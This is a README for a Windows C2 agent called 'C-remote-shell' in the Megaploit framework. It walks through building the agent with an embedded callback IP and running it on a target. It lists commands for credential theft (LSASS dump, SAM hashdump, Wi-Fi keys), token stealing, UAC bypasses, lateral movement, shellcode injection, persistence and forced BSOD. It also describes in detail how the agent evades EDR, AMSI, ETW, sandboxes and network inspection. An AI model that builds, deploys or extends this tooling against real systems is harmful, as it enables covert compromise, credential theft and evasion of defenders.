# C-remote-shell — Megaploit C Agent

A Windows-native C2 agent for the [Megaploit](https://github.com/hagba/Megaploit) framework.
Fully encrypted, authenticated, and evasion-hardened. Pairs with
`python server.py -lh <IP> -p <PORT>` — TLS is enabled automatically.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Commands Reference](#commands-reference)
3. [Evasion & Stealth](#evasion--stealth)
4. [Security Architecture](#security-architecture)
5. [Building the Agent](#building-the-agent)
6. [Debug Builds](#debug-builds)
7. [Project Layout](#project-layout)
8. [Configuration Reference](#configuration-reference)
9. [Protocol Wire Format](#protocol-wire-format)
10. [Adding a New Command](#adding-a-new-command)

---

## Quick Start

### Step 1 — Generate the shared key

Run this **once** from inside the `C-remote-shell/` directory:

```bash
python tools/gen_key.py
```

The tool prints a 64-character hex key and the exact `make` invocation to use.
**Copy the hex string to `secret.key` in the Megaploit repo root** (the same
directory as `server.py`):

```bash
# from the Megaploit repo root — NOT inside C-remote-shell/
echo -n "<64-hex-chars>" > secret.key
# also keep a copy in the submodule for manual make builds:
cp secret.key C-remote-shell/secret.key
```

> **`secret.key` must never be committed.** It is in `.gitignore` and every
> deployment must generate a fresh key. Using a shared or repository-sourced
> key allows anyone with a copy of the repo to authenticate a connection.

> **Both copies must be identical.** The server (`server.py`) reads from the
> repo root. A manual `make` build reads `C-remote-shell/secret.key`. If they
> differ, the HMAC challenge/response fails and the server closes the socket
> immediately after the TLS handshake — you will see no session appear.

### Step 2 — Build the agent

**Recommended — key and IP embedded in binary (no files needed on the target):**

```bash
# MSYS2 UCRT64 terminal, from inside C-remote-shell/
mingw32-make C2_IP=192.168.1.10 C2_PORT=4444 SECRET_KEY=<64-hex-chars>
```

> **`C2_IP` is required** — there is no default. Omitting it is a hard compile
> error to prevent shipping a binary with a stale lab IP.

The C2 IP and port are XOR-obfuscated by `tools/gen_c2_obf.py` at build time —
a plain `strings` scan will not reveal the target address. The key is separately
XOR-obfuscated against a compile-time mask in `.data`.

**Cross-compile from Linux / macOS:**

```bash
make CC=x86_64-w64-mingw32-gcc C2_IP=192.168.1.10 C2_PORT=4444 SECRET_KEY=<64-hex>
```

**Alternative — file-based key (development only, requires explicit flag):**

```bash
mingw32-make C2_IP=192.168.1.10 C2_PORT=4444 CFLAGS_EXTRA="-DALLOW_KEY_ON_DISK"
```

Place `secret.key` (64 hex chars) next to the EXE at runtime. This mode is
disabled by default in all builds without `ALLOW_KEY_ON_DISK` — a forensic
triage finds a key file on disk immediately.

### Step 3 — Start the Megaploit server

From the **Megaploit repo root** (the directory containing `server.py` and
`secret.key`):

```bash
python server.py -lh 192.168.1.10 -p 4444
```

No `--tls` flag is needed. The server automatically generates a self-signed TLS
certificate at `loot/tls/megaploit.crt` on first run and reuses it on every
subsequent start. The C agent validates TLS is present but does not verify the
certificate chain, so any self-signed cert works.

Expected startup output:

```
[+] TLS auto-cert (required for C agent)  →  loot/tls/megaploit.crt
[+] Listener ready on 0.0.0.0:4444
[*] Agents should call back to  192.168.1.10:4444
```

### Step 4 — Catch the session

Run `megaploit_c_agent.exe` on the target. The agent:

1. Applies PEB/kernel-image spoofing and LDR unlinking
2. Checks 10 independent sandbox/analysis-environment heuristics; exits silently if any fire
3. Sleeps 15–25 s via a direct `NtDelayExecution` syscall (no `Sleep` IAT entry)
4. Unhooks ntdll, patches ETW and AMSI
5. Auto-migrates into a live `svchost.exe` (or falls back to `%TEMP%\RuntimeBroker.exe`)
6. Connects back, completes the TLS + HMAC handshake, and a session appears in the console

### Troubleshooting: no session appears

| Symptom in `loot/audit.log` | Cause | Fix |
|---|---|---|
| `auth_failed` | Key mismatch — server and agent have different keys | Re-run `gen_key.py`, copy hex to **both** `secret.key` files, rebuild agent |
| `tls_error` | Server cert missing or corrupt | Delete `loot/tls/` and restart server |
| No entries at all | Server not reachable — TCP blocked | Check firewall; confirm `C2_IP` and `C2_PORT` match the server |
| Session appears then vanishes | `auto_migrate` succeeded but migrated copy cannot find `secret.key` | Use embedded key (`SECRET_KEY=<hex>` at build time) — no file needed |
| Agent exits immediately | Sandbox check fired | Build with `DBG=1` to see which check triggered |

---

## Commands Reference

### Native C handlers (direct Windows API — no child process)

| Verb | Args | Description |
|---|---|---|
| `sysinfo` | — | OS version, hostname, username, arch, CWD |
| `os_info` | — | Build number, install date, uptime |
| `cd` | `<path>` | `SetCurrentDirectoryA` |
| `ls` | `[path]` | Directory listing with size and date |
| `ps` | — | Running processes: PID, PPID, name, arch, owner |
| `kill` | `<pid>` | `TerminateProcess` (PEB-resolved, no IAT entry) |
| `env` | `[filter]` | Dump environment variables (optional substring filter) |
| `getclip` | — | Read clipboard text |
| `setclip` | `<text>` | Write clipboard text |
| `idle_time` | — | Seconds since last user input (`GetLastInputInfo`) |
| `lock_screen` | — | `LockWorkStation` |
| `active_windows` | — | Titles of all visible top-level windows |
| `msgbox` | `<title> <message>` | Pop a `MessageBoxA` dialog on a background thread |
| `upload` | `<filename>` | Receive a file from C2 and write to disk |
| `download` | `<path>` | Read a file from disk and send to C2 (max 64 MB) |
| `persist` | `<regkey> <filename>` | Copy EXE to `%APPDATA%\<filename>`, set HKCU Run key |
| `self_destruct` | — | Remove run key, `MoveFileExA` deferred delete, exit |
| `run_psh` | `<cmd>` | Execute a PowerShell one-liner via anonymous pipe |
| `open_url` | `<url>` | Open URL in default browser (`ShellExecuteA`) |
| `set_wallpaper` | `<path>` | Set desktop wallpaper (`SPI_SETDESKWALLPAPER`) |
| `mouse_move` | `<x> <y>` | Move cursor to absolute screen coordinates |
| `type_keys` | `<text>` | Simulate keyboard input (`SendInput KEYEVENTF_UNICODE`) |
| `clip_watch` | — | Poll clipboard for 30 s; return first change detected |
| `netstat` | — | Active TCP/UDP connections via `GetExtendedTcpTable` (no `cmd.exe`) |
| `arp` | — | ARP table via `GetIpNetTable2` (no `cmd.exe`) |
| `ifconfig` | — | Adapter addresses via `GetAdaptersAddresses` (no `cmd.exe`) |
| `routes` | — | Routing table via `GetIpForwardTable2` (no `cmd.exe`) |
| `wifi_passwords` | — | Wi-Fi profile keys via `WlanGetProfile` (no `cmd.exe`) |

### Lateral movement, credential access & privilege escalation

| Verb | Args | Description |
|---|---|---|
| `dump_lsass` | — | `NtCreateSection(SEC_IMAGE_NO_EXECUTE)` snapshot → `MiniDumpWriteDump` → `%TEMP%\lsass.dmp` |
| `token_impersonate` | `<pid>` | Steal + impersonate the primary token from a process |
| `token_revert` | — | `RevertToSelf()` — drop back to the process token |
| `getsystem` | — | Named-pipe token impersonation → SYSTEM token (randomised service name) |
| `uac_bypass` | `[cmd]` | `schtasks /RL HIGHEST` self-relaunch at High IL — no UAC prompt |
| `uac_reg_hijack` | `<payload>` | HKCU `ms-settings`/`mscfile` registry hijack (fodhelper/eventvwr) |
| `uac_dll_hijack` | `<dll> <exe>` | DLL search-order plant via `schtasks` CWD trick |
| `uac_com_hijack` | `<payload>` | `ICMLuaUtil::ShellExec` COM elevation moniker |
| `uac_env_expand` | `[payload]` | `%APPDATA%` redirect → `srrstr.dll` sideload |
| `lateral_wmi` | `<host> <cmd>` | Remote exec via WMI `Win32_Process.Create` — PEB-walk COM, no `LoadLibraryA` |
| `lateral_sc` | `<host> <cmd>` | Remote exec via SCM API (`OpenSCManagerA`/`CreateServiceA`) — no `cmd.exe` |

### Injection & migration

| Verb | Args | Description |
|---|---|---|
| `inject` | `<pid> <hex>` | Inject raw shellcode (hex string) into a process via NT syscalls |
| `inject_shellcode` | `<pid> <hex>` | Alias for `inject` |
| `migrate` | `<pid>` | Reflective PE injection into `<pid>`, then `ExitProcess(0)` |
| `dll_inject` | `<pid>` | Alias for `migrate` |
| `exec_bof` | `<hex> [args]` | In-process shellcode with BOF-style argument packing (W^X, threadpool) |
| `stage_load` | — | Receive a PE from C2 and load it reflectively in-process |

### Background jobs

| Verb | Args | Description |
|---|---|---|
| `bg` | `<cmd>` | Run a shell command in the background — returns a job ID immediately |
| `jobs` | — | List all background jobs (ID, state, bytes buffered) |
| `job_output` | `<id>` | Fetch and print the output of a completed job, then free the slot |
| `job_kill` | `<id>` | Terminate a running background job safely (waits for worker to stop before freeing slot) |

Background jobs are dispatched via the Windows thread pool (`ntdll!TppWorkerThread` call-stack)
so worker threads do not originate from a private RX address. Up to 16 concurrent jobs are
supported; each job buffers up to 4 MB of output.

### In-process evasion

| Verb | Description |
|---|---|
| `etw_patch` | Patch `EtwEventWrite` → `ret` in the current process |
| `sandbox_check` | Report CPU count, disk size, uptime, debugger presence, and VM artefacts |

### Power / destructive

| Verb | Description |
|---|---|
| `forceOff()` | `NtSetSystemPowerState` + `NtShutdownSystem` |
| `blueScreen()` | `NtRaiseHardError(STATUS_ASSERTION_FAILURE)` — kernel BSOD |

### Shell-command fallbacks (`cmd.exe`)

| Verb | Shell command run |
|---|---|
| `users` | `net user` |
| `logged_in` | `query user` |
| `services [filter]` | `sc query state= all` (optionally filtered with `findstr`) |
| `scheduled_tasks` | `schtasks /query /fo LIST` |
| `installed_software` | `reg query HKLM\...\Uninstall /s /v DisplayName` (both 32- and 64-bit hives) |
| `startup_items` | `reg query HKCU\...\Run` + `HKLM\...\Run` |
| `hashdump` | `reg save HKLM\SAM/SYSTEM → %TEMP%` (requires `SeBackupPrivilege`) |
| `dns_query <host>` | `nslookup "<host>"` (hostname sanitised; rejects shell metacharacters) |
| `cat <file>` | `type "<file>"` |
| `mkdir <path>` | `mkdir "<path>"` |
| `rm <path>` | `del /f /q` or `rmdir /s /q` |
| `find_files <path> [pat]` | `dir /s /b "<path>\<pat>"` |
| `file_hash <path>` | `certutil -hashfile "<path>" SHA256` |
| `tail <file> [n]` | `powershell Get-Content -Tail <n>` (default 20 lines) |
| `write_file <path> <content>` | `powershell Set-Content` |
| `chmod <mode> <path>` | `icacls "<path>"` (Windows approximation) |
| `find_writable <path>` | `icacls /t` filtered to writable ACEs |
| `find_suid` | `sc query` + `reg query ImagePath` for non-system-path services |
| `<anything else>` | Passed verbatim to `cmd /c ...` |

---

## Evasion & Stealth

The agent applies nine independent layers at startup, before the C2 connection
is attempted. All layers are compiled into the binary.

### 1. Application manifest

An embedded `RT_MANIFEST` resource (compiled by `windres` from `client/inject/agent.rc`)
declares supported OS GUIDs (Vista through Windows 11) and `requestedExecutionLevel asInvoker`.
The VERSIONINFO block returns plausible `svchost.exe` file-description strings to
`GetFileVersionInfoA`. Makes the binary look like a legitimately signed application to
AV heuristic engines that flag manifest-less executables.

### 2. Process-identity spoofing (`client/evasion/spoof_obf.c`)

| Technique | Effect |
|---|---|
| PEB field overwrite (`RTL_USER_PROCESS_PARAMETERS`) | Task Manager command-line column shows `svchost.exe -k netsvcs -p -s Schedule` |
| Kernel image name (`NtSetInformationProcess` class 49 + 74) | Process Hacker "Image" column shows `svchost.exe` |
| LDR unlink (`PEB→Ldr` list + `LdrpHashTable` bucket) | Hides the module from in-process module scanners; version-aware: skips `InInitializationOrderLinks` on Windows 8+ |

`PEB->ImageBaseAddress` is intentionally **not** overwritten — overwriting it to a
non-PE pointer would break `GetModuleHandleA(NULL)` and corrupt any in-process PE walking
(including reflective injection). All process-inspection tools that matter read
`ProcessParameters->ImagePathName` for the displayed name, not `ImageBaseAddress`.

The spoof strings (`svchost.exe` path and command line) are stored as XOR-encoded byte
arrays in `.data` — no wide-string literal appears in `.rdata` for FLOSS/strings/YARA to match.

### 3. EDR evasion (`client/evasion/evasion_obf.c`)

| Function | What it does |
|---|---|
| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions see clean stubs. |
| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub — stops Windows Event Tracing telemetry from this process. |
| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN` — prevents PowerShell/WSH/.NET AMSI scanning. |

### 4. Sandbox detection + startup delay (`client/evasion/sandbox.c`)

Ten independent checks run before the C2 connect loop:

| # | Check | Method |
|---|---|---|
| 1 | Hypervisor present | `CPUID` leaf 1, ECX bit 31 — only fires combined with check 2 or 4 to avoid false positives on cloud targets |
| 2 | RDTSC timing anomaly | Two serialised `RDTSC` reads; delta > 50 000 cycles (AND'd with check 1) |
| 3 | Physical RAM < 2 GB | `GlobalMemoryStatusEx` |
| 4 | Single logical CPU | `GetNativeSystemInfo` — only fires combined with check 1 |
| 5 | Known sandbox DLLs | PEB LDR walk; hashes of `SbieDll`, `cuckoomon`, `cmdvrt64`, Frida, VMware tools, VirtualBox guest additions, and more |
| 6 | Suspicious username / hostname | `GetUserNameA` / `GetComputerNameA`; matches 14 user names and 15 host names common in sandbox environments — all strings SLIT-decoded at runtime, none in `.rdata` |
| 7 | System drive < 60 GB | `GetDiskFreeSpaceExA("C:\\")` |
| 8 | Machine uptime < 3 minutes | `GetTickCount64()` |
| 9 | Debugger attached | `IsDebuggerPresent()` + `PEB.NtGlobalFlag == 0x70` + `NtQueryInformationProcess(ProcessDebugPort)` |
| 10 | No user input for > 60 s | `GetLastInputInfo` via PEB walk into user32 |

If the environment looks like a sandbox the agent **exits silently** — no error, no
dialog, no log. On a clean pass `sandbox_delay()` sleeps **15–25 seconds** via a direct
`NtDelayExecution` syscall — exhausting automated sandbox time budgets without importing
`Sleep`.

### 5. IAT-free API resolution (`client/evasion/peb_walk.c`, `client/evasion/k32_walk.h`)

`GetModuleHandleA`, `GetProcAddress`, `LoadLibraryA`, `CreateMutexA`, `OpenProcess`,
`TerminateProcess`, `OpenProcessToken`, `DuplicateTokenEx`, and `ImpersonateLoggedOnUser`
do not appear in the import table. The agent resolves all exports via direct PEB walks.

| Function | What it does |
|---|---|
| `peb_get_module(hash)` | Walks `PEB→Ldr→InMemoryOrderModuleList`, returns the base of the module whose lowercase name matches a seeded djb2-xorshift hash |
| `peb_get_export(base, hash)` | Full linear hash scan over the PE export directory — correct on all Windows builds, no static constants in `.data` |
| `peb_hash_str(s)` / `peb_hash_wstr(w)` | Runtime seeded djb2-xorshift hash — seed set from `RDTSC` once per run; hash values differ between executions and cannot be pre-computed by static scanners |
| `k32_<FunctionName>` wrappers | Thin inline wrappers in `k32_walk.h` that call through `peb_get_export`; produce no IAT entries |

### 6. Direct syscalls — Hell's Gate / Halo's Gate / Tartarus' Gate (`client/evasion/syscall_obf.c`)

Bypasses ntdll entirely so EDR hooks on Win32 API wrappers are irrelevant:

| Gate | Condition | Strategy |
|---|---|---|
| **Hell's Gate** | Clean stub (`mov r10,rcx` / `mov eax,SSN`) | Read SSN at offset `+4` |
| **Tartarus' Gate** | `int 0x2e` fallback stub | Same SSN read; gadget becomes `CD 2E C3` |
| **Halo's Gate** | Stub hooked with `E9` JMP | Scan ±N neighbouring stubs; `SSN[target] = SSN[neighbour] ± delta` |

Stride between stubs is measured at runtime. Each SSN gets its own gadget pointer
(`syscall;ret` vs `int 0x2e;ret`). Trampolines jump into ntdll so the kernel
trap-frame RIP always points inside ntdll — defeating EDR heuristics that flag
syscalls originating outside ntdll.

All NT function name strings are XOR-encoded blobs decoded on the stack at
runtime — no plaintext strings appear in `.rdata`.

### 7. Sleep obfuscation — Ekko-variant (`client/evasion/sleep_obf.c`)

**Enabled by default.** Disable with `SLEEP_OBF=0` at build time.

When active, `sleep_obf_delay()` ChaCha20-encrypts the agent's own `.text` and `.data`
sections before each sleep interval and decrypts them on wake:

- Key derived from `RDTSC_seed || module_base || image_size` — changes every execution
- Encryption writes through `SC_NtWriteVirtualMemory` on the current process handle, bypassing page-protection checks without flipping pages to RW (which would fire `KERNEL_THREATINT_TASK_PROTECT`)
- The `sleep_obf_delay()` function itself lives in a separate `.slpobf` section that is excluded from the encryption pass
- Memory scanner during sleep interval sees only ciphertext — no YARA hits on string patterns or code signatures

Opt out at build time:
```bash
mingw32-make C2_IP=10.0.0.1 SECRET_KEY=... SLEEP_OBF=0
```

### 8. Auto-migration (`client/inject/inject.c`)

On startup, before the connect loop:

**Tier 1 — Reflective in-memory injection (no disk artifact):**
1. Finds a live 64-bit `svchost.exe` that can be opened with injection rights
2. Maps self via the reflective PE loader blob (`client/inject/loader.c`) using module-stomping into one of a randomised pool of candidate system DLLs (`xpsprint.dll`, `msls31.dll`, `tsprint.dll`, `npsm.dll`)
3. Calls `AgentRun()` in the host process via the Windows thread pool, then `ExitProcess(0)`

**Tier 2 — `%TEMP%` copy fallback (if Tier 1 fails):**
1. Copies itself to `%TEMP%\RuntimeBroker.exe` (or the name set by `MIGRATE_NAME=`)
2. Spawns it as `CREATE_SUSPENDED`, resumes, then `ExitProcess(0)`

### 9. Injection hardening

- All NT calls go through direct-syscall trampolines — no `VirtualAllocEx` or `CreateRemoteThread` in the import table
- Two-phase memory permissions: **RW** → **RX** — no RWX pages ever
- `NtCreateThreadEx` called with `HideFromDebugger` flag
- `AgentRun()` dispatches via `sc_threadpool_exec` so the agent thread call-stack shows `ntdll!TppWorkerThread` rather than a private RX address
- Reconnect delay defaults to **60 s ± 50%** (CV ≈ 0.29) to stay within natural variance of legitimate background application polling and below the MDE beacon-detection threshold

---

## Security Architecture

Four layers wrap every byte in transit:

```
TLS 1.2/1.3 (SChannel, AEAD-only)
  └─ HMAC-SHA256 challenge/response  (secret.key, 32 raw bytes)
       └─ Protocol v2 magic-byte echo  (0x4d)
            └─ AES-256-GCM framed messages
                 [uint32-BE length][nonce(12)][ciphertext][GCM-tag(16)]
                 + uint64-BE sequence counter (replay protection)
```

**Layer 1 — TLS**
`SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO`
(AEAD-only cipher suites including ChaCha20-Poly1305 on Windows 10 21H2+),
`ISC_REQ_NO_RENEGOTIATION`.

**Layer 2 — HMAC authentication**
Server sends a 16-byte random challenge. Agent replies with
`HMAC-SHA256(secret_key[32], challenge[16])`. Server drops on mismatch.

**Layer 3 — Protocol handshake**
Server sends `0x4d` (`M`). Agent echoes it back. Version gate.

**Layer 4 — AES-256-GCM framing**
Every message encrypted with a fresh 12-byte nonce. A big-endian 64-bit
sequence number prepended to the plaintext enforces strict replay protection.

### Optional: Certificate pinning

Pass the server certificate's SHA-256 fingerprint at build time to reject
SSL-inspection proxies:

```bash
# Strip colons from openssl output, pass the 64-char hex string:
openssl x509 -in server.pem -noout -fingerprint -sha256
mingw32-make C2_IP=10.0.0.1 SECRET_KEY=... C2_CERT_PIN=aabb...
```

### Optional: Malleable HTTP/1.1 transport profile

Define `C2_HTTP_HOST` to wrap each AES-GCM frame as an HTTP/1.1 POST body so
C2 traffic resembles ordinary HTTPS to network sensors and NGFW DPI:

```bash
mingw32-make C2_IP=<cdn-ip> SECRET_KEY=... \
  CFLAGS_EXTRA="-DC2_HTTP_PROFILE -DC2_HTTP_HOST=\"cdn.example.com\""
```

Additional malleable options (all optional):

| Macro | Default | Description |
|---|---|---|
| `C2_HTTP_URI` | `/api/v1/upload` | POST URI for agent→C2 frames |
| `C2_HTTP_UA` | Chrome 124 UA string | `User-Agent` header |
| `C2_HTTP_PREPEND` / `C2_HTTP_PREPEND_LEN` | — | Bytes prepended to POST body (e.g. GIF89a magic) |
| `C2_HTTP_APPEND` / `C2_HTTP_APPEND_LEN` | — | Bytes appended to POST body |
| `C2_HTTP_EXTRA_HDRS` | — | Additional raw HTTP headers (`\r\n`-terminated) |
| `C2_HTTP_URI_1` … `C2_HTTP_URI_4` | — | Up to four rotating URIs cycled round-robin per frame |

---

## Building the Agent

### Requirements

- **Windows host** with [MSYS2 UCRT64](https://www.msys2.org/) (`C:\msys64\ucrt64\bin` in PATH), **or**
- **Linux / macOS** with `x86_64-w64-mingw32-gcc` (`apt install mingw-w64`)
- **Python 3** (for `tools/gen_key.py`, `tools/gen_c2_obf.py`, and `client/evasion/gen_obf.py`)

### Option A — MinGW / MSYS2 UCRT64 (recommended)

```bash
# Embedded key, obfuscated IP (operational build):
mingw32-make C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-hex-chars>

# Development build (file-based key, no evasion, instant startup):
mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
```

### Option B — MinGW cross-compile (Linux / macOS)

```bash
make CC=x86_64-w64-mingw32-gcc C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-hex>
```

### Option C — MSVC (Developer Command Prompt)

```cmd
nmake C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-hex>
```

### Build flags

| Flag | Purpose |
|---|---|
| `C2_IP=` | **(required)** C2 listener IP or hostname |
| `C2_PORT=` | TCP port (default `50005`) |
| `SECRET_KEY=` | Embed 64-hex-char key in binary (no `secret.key` on target) |
| `C2_CERT_PIN=` | Optional: 64-hex SHA-256 fingerprint — pin server certificate |
| `MUTEX_NAME=` | Override single-instance mutex name (default mimics a Windows WIL mutex) |
| `MIGRATE_NAME=` | Override auto-migrate destination filename (default: `RuntimeBroker.exe`) |
| `SC_SVC_NAME=` | Override the transient service name base used by `lateral_sc` |
| `SLEEP_OBF=0` | Disable sleep obfuscation (enabled by default in all builds) |
| `DBG=1` | Debug build — see [Debug Builds](#debug-builds) |
| `CFLAGS_EXTRA=` | Pass arbitrary extra compiler flags |
| `-DALLOW_KEY_ON_DISK` | Enable file-based `secret.key` loading (development builds only) |
| `-DDISABLE_AUTO_MIGRATE` | Skip migration (only valid via `DBG=1` — blocked in release builds) |
| `-DDISABLE_EVASION` | Skip `unhook_ntdll`, `etw_patch`, `amsi_patch` (debug only) |
| `-DDISABLE_SANDBOX_CHECK` | Skip sandbox detection and delay (debug only) |

> **Security guard:** `DBG=1` and `SECRET_KEY=` cannot be combined. A debug
> binary must not contain a real operational key. Use `-DALLOW_KEY_ON_DISK` and
> a dev key file for debug sessions.

### Loader blob regeneration

The reflective PE loader is compiled into a small position-independent blob
committed to the repo (`client/inject/loader_blob.h`). Regenerate it after
editing `client/inject/loader.c`:

```bash
make blob           # regenerate using LOADER_CC
make blob-verify    # CI: verify committed blob matches a fresh build
```

---

## Debug Builds

The agent includes a structured runtime debugger that is **completely compiled
out in release builds** — zero overhead, zero extra strings, zero extra imports.

### Enable

```bash
mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
```

`DBG=1` automatically sets:
- `-DAGENT_DEBUG` — activates all `dbg_*()` calls
- `-DDISABLE_AUTO_MIGRATE` — keeps the agent in the original process
- `-DDISABLE_SANDBOX_CHECK` — skips sandbox delay for instant startup
- `-DDISABLE_EVASION` — skips ntdll/ETW/AMSI patches
- `-DALLOW_KEY_ON_DISK` — enables file-based key loading
- `-DAGENT_DEBUG_LOG_TAG=<4-hex>` — randomised log filename suffix per build (avoids a static YARA-matchable path)

### Output

Every event goes to **two destinations simultaneously**:

1. **`C:\Windows\Temp\megaploit_agent_<tag>.log`** — timestamped, appended across runs (tag is unique per build)
2. **`OutputDebugStringA`** — prefix `[MAGENT]` — live in x64dbg / WinDbg / Sysinternals DbgView

### Log format

```
[HH:MM:SS.mmm | SUBSYS | SEV ] message
```

### Subsystems logged

| Tag | Covers |
|---|---|
| `INIT  ` | PID, image path, CWD, integrity level (RID), username, OS build via `RtlGetVersion` |
| `NTCALL` | `ntcalls_load()` — ntdll base, per-pointer VA; `ntcalls_verify()` — `RtlAdjustPrivilege` NTSTATUS; full per-bit decode of both return values |
| `SCALL ` | `sc_init()` — all 11 SSNs and gadget addresses after Hell's/Halo's Gate |
| `INJECT` | `inject_init()` return value with pass/fail reason |
| `SPOOF ` | `spoof_peb()`, `spoof_kernel_image()`, `unlink_self_from_ldr()` entry |
| `MIGRAT` | `auto_migrate()` target PID, path, result |
| `SNDBOX` | `sandbox_check()` — overall result + per-check detail (CPUID, RDTSC delta, RAM, CPUs, uptime) |
| `EVASN ` | `unhook_ntdll()`, `etw_patch()`, `amsi_patch()` before/after |
| `KEY   ` | `load_secret_key()` path, decode result (key bytes never logged) |
| `NET   ` | `WSAStartup`, `socket()`, `InetPtonA`, `connect()` retries with `WSAGetLastError()` |
| `SOCK  ` | `setsockopt()` return values for `SO_RCVTIMEO` and `SO_KEEPALIVE` |
| `TLS   ` | `tls_connect()` result + `lastErr` with human-readable decode of all `TLS_ERR_*` codes |
| `SHELL ` | `shell_run()` session start and end |
| `THREAD` | `_agent_thread` lifecycle with PID and TID (post-migration code path) |

### Return value reference

**`ntcalls_load()`**

| Value | Meaning |
|---|---|
| `0xFF` | All four exports resolved — OK |
| `0x00` | `ntdll.dll` not found in PEB |
| `0x01` | `RtlAdjustPrivilege` missing |
| `0x02` | `NtShutdownSystem` missing |
| `0x04` | `NtSetSystemPowerState` missing |
| `0x08` | `NtRaiseHardError` missing |
| Multiple | OR'd together; `0x0F` = all four missing |

**`ntcalls_verify()`**

| Value | Meaning |
|---|---|
| `0x00` | All OK — pointers valid, `SeShutdownPrivilege` acquired |
| `0x01–0x08` | Same bit map as above — pointer is NULL |
| `0x10` | `RtlAdjustPrivilege()` returned non-`STATUS_SUCCESS` (privilege denied) |

---

## Project Layout

```
C-remote-shell/
│
├── Makefile                        Auto-detect MSVC/MinGW; targets: client, legacy, server,
│                                   blob, blob-verify, clean
│
├── client/
│   │
│   ├── core/                       Entry point and shared NT infrastructure
│   │   ├── config.h                C2 IP/port, key mode, buffer sizes, obfuscated defaults
│   │   ├── main.c                  WinMain + _agent_reconnect_loop + AgentRun + _agent_thread + DllMain
│   │   └── ntcalls.c / ntcalls.h   NT function pointer load/verify with bitmask return codes
│   │
│   ├── debug/                      Runtime debugger (compiled only with DBG=1)
│   │   ├── agent_debug.h           Public API + no-op stubs (zero overhead in release)
│   │   └── agent_debug.c           Log file + OutputDebugStringA implementation
│   │
│   ├── evasion/                    All stealth and hook-bypass code
│   │   ├── spoof.h / spoof.c           PEB + kernel image name spoofing; LDR unlinking
│   │   ├── spoof_obf.c                 Obfuscated build (compiled into binary)
│   │   ├── evasion.h / evasion.c       unhook_ntdll, etw_patch, amsi_patch
│   │   ├── evasion_obf.c               Obfuscated build (compiled into binary)
│   │   ├── peb_walk.h / peb_walk.c     PEB module/export resolution; seeded djb2-xorshift hash
│   │   ├── k32_walk.h                  IAT-free wrappers for kernel32 + advapi32 APIs
│   │   ├── syscall.h / syscall.c       Hell's/Halo's/Tartarus' Gate direct syscall stubs
│   │   ├── syscall_obf.c               Obfuscated build (compiled into binary)
│   │   ├── sandbox.h / sandbox.c       10-check sandbox/VM/debugger detection + startup delay
│   │   ├── sleep_obf.h / sleep_obf.c   ChaCha20 sleep obfuscation (enabled by default)
│   │   ├── nt_offsets.h                Single source of truth for PEB/LDR/SPI field offsets
│   │   ├── obf.h                       OBF_S / OBF_W stack-decode macros
│   │   └── gen_obf.py                  Regenerates *_obf.c from source files
│   │
│   ├── inject/                     Process injection, reflective PE loading, auto-migration
│   │   ├── inject.h / inject.c     inject_shellcode, migrate_to_pid, auto_migrate,
│   │   │                           sleep_obf_delay, jitter_sleep, sc_threadpool_exec
│   │   │                           Module-stomping pool: xpsprint.dll, msls31.dll,
│   │   │                           tsprint.dll, npsm.dll (randomised per invocation)
│   │   ├── loader.h / loader.c     Position-independent reflective PE loader (< 512 B blob)
│   │   ├── loader_blob.h           Auto-generated: loader stub as a C byte array (committed)
│   │   ├── agent.rc                VERSIONINFO + RT_MANIFEST resource script
│   │   ├── agent.manifest          Application manifest (embedded as RT_MANIFEST)
│   │   └── agent.res               Compiled resource object (windres output; committed)
│   │
│   └── shell/                      Command dispatch and all C2 verb handlers
│       ├── shell.h                 Public API: shell_run(TLS_CONTEXT *)
│       ├── shell.c                 O(1) dispatch table (_dispatch_verb), background job table,
│       │                           _json_unwrap, _send_str, _shell_exec
│       ├── shell_internal.h        Shared internal API (handler forward declarations)
│       ├── handlers_system.c       sysinfo, os_info, cd, ls, ps, kill, env,
│       │                           idle_time, lock_screen, active_windows,
│       │                           netstat, arp, ifconfig, routes, wifi_passwords
│       ├── handlers_system_obf.c   Obfuscated build of handlers_system.c
│       ├── handlers_ui.c           getclip, setclip, msgbox, upload, download,
│       │                           persist, self_destruct, run_psh, open_url,
│       │                           set_wallpaper, mouse_move, type_keys, clip_watch
│       ├── handlers_lateral.c      dump_lsass, token_impersonate, token_revert,
│       │                           getsystem, uac_bypass, uac_reg_hijack,
│       │                           uac_dll_hijack, uac_com_hijack, uac_env_expand,
│       │                           lateral_wmi (PEB-walk COM), lateral_sc (SCM API),
│       │                           exec_bof
│       └── handlers_lateral_obf.c  Obfuscated build of handlers_lateral.c
│
├── tls/
│   ├── tls_client.h                TLS_CONTEXT struct, public API declarations
│   ├── tls_client.c                TLS + HMAC + AES-GCM implementation (SChannel + BCrypt)
│   └── http_profile.h              Malleable HTTP/1.1 transport profile (C2_HTTP_PROFILE)
│
├── server/                         Refactored POSIX C2 listener (Linux / macOS)
│   ├── main.c / server.c / prompt.c
│   └── config.h
│
├── tools/
│   ├── gen_key.py                  Generate a random 32-byte key + obfuscated make invocation
│   ├── gen_c2_obf.py               XOR-obfuscate C2_IP/C2_PORT → compiler -D flags
│   ├── gen_spoof_obf.py            XOR-obfuscate SPOOF_IMAGE/SPOOF_CMDLINE → compiler -D flags
│   └── gen_loader_blob.py          Compile loader.c → extract blob → write loader_blob.h
│
├── Source.c                        Legacy monolithic client (kept for `make legacy`)
├── definitions.h                   Shared globals for Source.c
└── serverShell.c                   Legacy POSIX server (kept for `make server-posix-legacy`)
```

---

## Configuration Reference

All compile-time knobs live in [`client/core/config.h`](client/core/config.h).

| Constant | Default | Description |
|---|---|---|
| `C2_IP` | *(required)* | C2 listener address — XOR-obfuscated by `gen_c2_obf.py` at build time |
| `C2_PORT` | `50005` | C2 listener port — XOR-obfuscated by `gen_c2_obf.py` at build time |
